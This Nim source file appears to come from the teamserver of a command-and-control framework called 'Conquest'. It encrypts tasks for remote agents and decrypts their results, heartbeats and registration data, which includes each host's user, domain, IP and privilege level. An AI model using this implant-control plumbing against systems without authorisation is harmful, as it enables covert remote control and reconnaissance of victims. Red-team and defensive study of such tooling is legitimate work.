import strutils, strformat, streams, times, tables
import ../utils
import ../../common/[types, utils, serialize, sequence, crypto]

proc serializeTask*(cq: Conquest, task: var Task): seq[byte] = 

    var packer = Packer.init() 

    # Serialize payload
    packer
        .add(task.taskId)
        .add(task.listenerId)
        .add(task.timestamp)
        .add(task.command)
        .add(task.argCount)

    for arg in task.args:
        packer.addArgument(arg)

    let payload = packer.pack() 
    packer.reset()

    # Encrypt payload body
    let (encData, gmac) = encrypt(cq.agents[Uuid.toString(task.header.agentId)].sessionKey, task.header.iv, payload, task.header.seqNr)

    # Set authentication tag (GMAC)
    task.header.gmac = gmac

    # Serialize header 
    let header = packer.serializeHeader(task.header, uint32(payload.len))

    return header & encData

proc deserializeTaskResult*(cq: Conquest, resultData: seq[byte]): TaskResult = 

    var unpacker = Unpacker.init(Bytes.toString(resultData))

    let header = unpacker.deserializeHeader()

    # Packet Validation
    validatePacket(header, cast[uint8](MSG_RESULT)) 

    # Decrypt payload 
    let payload = unpacker.getBytes(int(header.size))
    let decData= validateDecryption(cq.agents[Uuid.toString(header.agentId)].sessionKey, header.iv, payload, header.seqNr, header)

    # Deserialize decrypted data
    unpacker = Unpacker.init(Bytes.toString(decData))

    let 
        taskId = unpacker.getUint32()
        listenerId = unpacker.getUint32()
        timestamp = unpacker.getUint32()
        command = unpacker.getUint16()
        status = unpacker.getUint8()
        resultType = unpacker.getUint8()
        length = unpacker.getUint32()
        data = unpacker.getBytes(int(length))

    return TaskResult(
        header: header,
        taskId: taskId,
        listenerId: listenerId, 
        timestamp: timestamp,
        command: command,
        status: status,
        resultType: resultType,
        length: length,
        data: data
    )

proc deserializeNewAgent*(cq: Conquest, data: seq[byte]): Agent = 

    var unpacker = Unpacker.init(Bytes.toString(data))

    let header= unpacker.deserializeHeader()

    # Packet Validation
    validatePacket(header, cast[uint8](MSG_REGISTER)) 

    # Key exchange
    let agentPublicKey = unpacker.getByteArray(Key)
    let sessionKey = deriveSessionKey(cq.keyPair, agentPublicKey)
    
    # Decrypt payload 
    let payload = unpacker.getBytes(int(header.size)) 
    let decData= validateDecryption(sessionKey, header.iv, payload, header.seqNr, header)

    # Deserialize decrypted data
    unpacker = Unpacker.init(Bytes.toString(decData))

    let 
        listenerId = unpacker.getUint32()
        username = unpacker.getDataWithLengthPrefix()
        hostname = unpacker.getDataWithLengthPrefix()
        domain = unpacker.getDataWithLengthPrefix()
        ip = unpacker.getDataWithLengthPrefix()
        os = unpacker.getDataWithLengthPrefix()
        process = unpacker.getDataWithLengthPrefix()
        pid = unpacker.getUint32() 
        isElevated = unpacker.getUint8()
        sleep = unpacker.getUint32()

    return Agent(
        agentId: Uuid.toString(header.agentId),
        listenerId: Uuid.toString(listenerId),
        username: username, 
        hostname: hostname,
        domain: domain,
        ip: ip,
        os: os,
        process: process,
        pid: int(pid),
        elevated: isElevated != 0,
        sleep: int(sleep),
        tasks: @[],  
        firstCheckin: now(),
        latestCheckin: now(),
        sessionKey: sessionKey
    )

proc deserializeHeartbeat*(cq: Conquest, data: seq[byte]): Heartbeat = 

    var unpacker = Unpacker.init(Bytes.toString(data))

    let header = unpacker.deserializeHeader()

    # Packet Validation
    validatePacket(header, cast[uint8](MSG_HEARTBEAT)) 

    # Decrypt payload
    let payload = unpacker.getBytes(int(header.size))
    let decData= validateDecryption(cq.agents[Uuid.toString(header.agentId)].sessionKey, header.iv, payload, header.seqNr, header)

    # Deserialize decrypted data
    unpacker = Unpacker.init(Bytes.toString(decData))

    return Heartbeat(
        header: header,
        listenerId: unpacker.getUint32(),
        timestamp: unpacker.getUint32()
    )